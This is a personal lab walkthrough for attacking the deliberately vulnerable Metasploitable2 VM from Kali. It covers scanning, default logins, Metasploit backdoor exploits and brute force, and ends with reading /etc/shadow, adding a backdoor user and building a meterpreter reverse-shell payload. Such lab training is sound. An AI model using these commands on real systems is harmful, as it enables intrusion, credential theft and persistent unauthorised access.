**Prepared by Puru**

---
## 1. Setting Up the Lab Environment

### 1.1 Download and Install Virtual Machines

1. **Download Kali Linux VM**:
    
    - Visit the official Kali Linux website (https://www.kali.org/get-kali/)
    - Download and import the VM into your virtualization platform
2. **Download Metasploitable2**:
    
    - Download from official sources (https://sourceforge.net/projects/metasploitable/)
    - Import into your virtualization software


## 2. Initial Reconnaissance

### 2.1 Identifying Target IP

1. **Find Metasploitable2 IP Address**:
    
    - Log into Metasploitable2 using default credentials: `msfadmin/msfadmin`
    - Run `ifconfig` to identify the machine's IP address
2. **Set Target Variable in Kali**:
    
    ```bash
    export TARGET=<metasploitable_ip>
    ```
    

### 2.2 Port Scanning

1. **Run Comprehensive Nmap Scan**:
    
    ```bash
    sudo nmap -sV -Pn $TARGET
    ```
    
    This command:
    
    - `-sV`: Performs service version detection
    - `-Pn`: Skips host discovery (assumes the host is online)
2. **Save Scan Results**:
    
    ```bash
    sudo nmap -sV -p- -O $TARGET -oA metasploitable_full_scan
    ```
    
![[Pasted image 20250426122625.png]]

## 3. Service Enumeration

Review the Nmap results to identify vulnerable services. Common ports/services on Metasploitable2 include:

- Port 21: FTP (vsftpd 2.3.4)
- Port 22: SSH (OpenSSH 4.7p1)
- Port 23: Telnet
- Port 25: SMTP (Postfix)
- Port 80: HTTP (Apache)
- Ports 139/445: Samba
- Port 3306: MySQL
- Port 5432: PostgreSQL
- Port 5900: VNC
- Port 6667: UnrealIRCd
- Port 8180: Apache Tomcat

## 4. Exploiting Common Services

### 4.1 FTP Exploitation (Port 21)

#### Method 1: Direct Authentication

1. **Connect to FTP Service**:
    
    ```bash
    ftp $TARGET
    ```
    
2. **Login with Default Credentials**:
    
    - Username: `msfadmin`
    - Password: `msfadmin`
3. **Anonymous Login Test**:
    
    ```bash
    # At FTP prompt
    open $TARGET
    # When prompted for username
    anonymous
    # When prompted for password
    [enter email address or press Enter]
    #DOES NOT WORK SOMETIMES
    ```
![[Pasted image 20250426123426.png]]


#### Method 2: vsftpd 2.3.4 Backdoor Exploitation

1. **Launch Metasploit**:
    
    ```bash
    msfconsole
    ```
    
2. **Search for vsftpd Exploit**:
    
    ```bash
    search vsftpd
    ```
    
3. **Use the Backdoor Exploit**:
    
    ```bash
    use exploit/unix/ftp/vsftpd_234_backdoor
    ```
    
4. **Configure and Execute**:
    
    ```bash
    set RHOSTS $TARGET
    run
    ```
    
5. **Verify Access**:
    
    ```bash
    whoami    # Should return "root"
    ```
![[Pasted image 20250426123858.png]]


### 4.2 SSH Exploitation (Port 22)

1. **Brute Force SSH**:

  ```bash
#DOESNOT WORK SOMETIMES  
hydra -l msfadmin -P /usr/share/wordlists/metasploit/unix_passwords.txt $TARGET ssh
   
   ```

2. **Direct SSH Access**:

 ```bash   
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa,ssh-dss msfadmin@$TARGET
 ```
 
![[Pasted image 20250426124419.png]]


### 4.3 Telnet Exploitation (Port 23)

1. **Connect via Telnet**:
    
    ```bash
    telnet $TARGET
    ```
    
2. **Login with Default Credentials**:
    
    - Username: `msfadmin`
    - Password: `msfadmin`
3. **Verify Access**:
    
    ```bash
    whoami
    ```
![[Pasted image 20250426124526.png]]


### 4.4 SMTP Exploitation (Port 25) (NOT COMPLETE)

*INSTALL USER-ENUM*
```shell
apt install smtp-user-enum
```


1. **Enumerate Users via SMTP**:

  ```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $TARGET
    ```
![[Pasted image 20250426124812.png]]

2. **Use Metasploit for SMTP Enumeration**:
    
    ```bash
    msfconsole
    use auxiliary/scanner/smtp/smtp_enum
    set RHOSTS $TARGET
    run
    ```
![[Pasted image 20250426125207.png]]


### 4.5 HTTP Exploitation (Port 80)

*INSTALL NIKTO*
```shell
apt install nikto
```

1. **Web Application Scanning**:
    
    ```bash
    nikto -h $TARGET
    ```
    
2. **Directory Enumeration**:
    
    ```bash
    dirb http://$TARGET
    ```

	![[Pasted image 20250426130526.png]]

3. **Exploiting DVWA (Damn Vulnerable Web App)**:
    
    - Navigate to `http://$TARGET/dvwa/`
    - Default credentials: `admin/password`
    - Explore various vulnerability categories:
        - SQL Injection
        - Command Injection
        - Cross-Site Scripting (XSS)
        - File Inclusion

	![[Pasted image 20250426130041.png]]
	
4. **Exploiting Mutillidae**:
    
    - Navigate to `http://$TARGET/mutillidae/`
    - Test various OWASP Top 10 vulnerabilities

### 4.6 Samba Exploitation (Ports 139/445) (NOT COMPLETE)

1. **Enumerate Samba Shares**:
    
    ```bash
    enum4linux -a $TARGET
    ```
    
2. **List Available Shares**:
    
    ```bash
    smbclient -L $TARGET
    ```
![[Pasted image 20250426130913.png]]

	    
3. **Access Shares without Password**:
    
    ```bash
    smbclient //$TARGET/tmp
    ```
	![[Pasted image 20250426130955.png]]
	
4. **Exploiting Samba using Metasploit**:
    
    ```bash
    msfconsole
    use exploit/multi/samba/usermap_script
    set RHOSTS $TARGET
    run
    ```
    

### 4.7 PostgreSQL Exploitation (Port 5432) (NOT COMPLETE)

1. **Test Default Credentials**:
    
    ```bash
    psql -h $TARGET -U postgres
    ```
    ![[Pasted image 20250426131243.png]]
    
2. **Use Metasploit for PostgreSQL Exploitation**:
    
    ```bash
    msfconsole
    search PostgreSQL
    use auxiliary/scanner/postgres/postgres_login
    set RHOSTS $TARGET
    run
    ```
    
3. **Execute Code via PostgreSQL**:
    
    ```bash
    msfconsole
    use exploit/linux/postgres/postgres_payload
    set RHOSTS $TARGET
    set LHOST [your_kali_ip]
    run
    ```
    

### 4.8 VNC Exploitation (Port 5900)  (NOT COMPLETE)

1. **VNC Password Cracking**:
    
    ```bash
    msfconsole
    use auxiliary/scanner/vnc/vnc_login
    set RHOSTS $TARGET
    run
    ```
    
2. **Connect to VNC Server**:
    
    ```bash
    vncviewer $TARGET
    ```
    
    - The default VNC password is typically: `password`

### 4.9 Apache Tomcat Exploitation (Port 8180) (NOT COMPLETE)

1. **Access Tomcat Manager**:
    
    - Navigate to `http://$TARGET:8180/manager/html`
    - Default credentials: `tomcat/tomcat`
2. **Deploy Malicious WAR File using Metasploit**:
    
    ```bash
    msfconsole
    search apache tomcat
    use exploit/multi/http/tomcat_mgr_upload
    set RHOSTS $TARGET
    set RPORT 8180
    set HttpUsername tomcat
    set HttpPassword tomcat
    run
    ```
    

### 4.10 MySQL Exploitation (Port 3306) (NOT COMPLETE)

1. **Connect to MySQL**:
    
    ```bash
    mysql -h $TARGET -u root --skip-ssl

    ```
    ![[Pasted image 20250426131501.png]]
    
    - MySQL root often has no password in Metasploitable2
2. **Enumerate Databases**:
    
    ```sql
    SHOW DATABASES;
    USE mysql;
    SELECT user, password FROM user;
    ```
    
3. **MySQL UDF Exploitation with Metasploit**:
    
    ```bash
    msfconsole
    use exploit/multi/mysql/mysql_udf_payload
    set RHOSTS $TARGET
    set PASSWORD ""
    set USERNAME root
    run
    ```
    

### 4.11 IRC Exploitation (Port 6667) (NOT COMPLETE)

1. **Identify UnrealIRCd Version**:
    
    ```bash
    nmap -sV -p 6667 $TARGET
    ```
    
2. **Exploit UnrealIRCd Backdoor**:
    
    ```bash
    msfconsole
    use exploit/unix/irc/unreal_ircd_3281_backdoor
    set RHOSTS $TARGET
    run
    ```
    

### 4.12 Java RMI Exploitation (Port 1099) (NOT COMPLETE)

1. **Enumerate RMI Service**:
    
    ```bash
    msfconsole
    use auxiliary/scanner/misc/java_rmi_server
    set RHOSTS $TARGET
    run
    ```
    
2. **Exploit Java RMI**:
    
    ```bash
    msfconsole
    use exploit/multi/misc/java_rmi_server
    set RHOSTS $TARGET
    run
    ```
    

### 4.13 NFS Exploitation (Port 2049) (NOT COMPLETE)

1. **List NFS Exports**:
    
    ```bash
    showmount -e $TARGET
    ```
    
2. **Mount NFS Share**:
    
    ```bash
    mkdir /tmp/nfs
    mount -t nfs $TARGET:/path/to/share /tmp/nfs
    ```
    
3. **Check for Sensitive Files**:
    
    ```bash
    ls -la /tmp/nfs
    ```
    

## 5. Post-Exploitation Techniques 

Once you've gained access to the system, perform the following:

### 5.1 Privilege Escalation

1. **Check Current User and Privileges**:
    
    ```bash
    id
    sudo -l
    ```
    
2. **Search for SUID Binaries**:
    
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```
    
3. **Check for World-Writable Files**:
    
    ```bash
    find / -writable -type f 2>/dev/null
    ```
    

### 5.2 Data Collection

1. **Gather System Information**:
    
    ```bash
    uname -a
    cat /etc/issue
    cat /proc/version
    ```
    
2. **Collect Network Information**:
    
    ```bash
    ifconfig
    netstat -antup
    ```
    
3. **Harvest User Information**:
    
    ```bash
    cat /etc/passwd
    cat /etc/shadow    # If you have root access
    ```
    

### 5.3 Establishing Persistence

1. **Create a Backdoor User**:
    
    ```bash
    useradd -m -s /bin/bash -p $(openssl passwd -1 password) backdooruser
    ```
    
2. **Deploy a Reverse Shell**:
    
    ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[your_kali_ip] LPORT=4444 -f elf > /tmp/backdoor
    chmod +x /tmp/backdoor
    ```
    

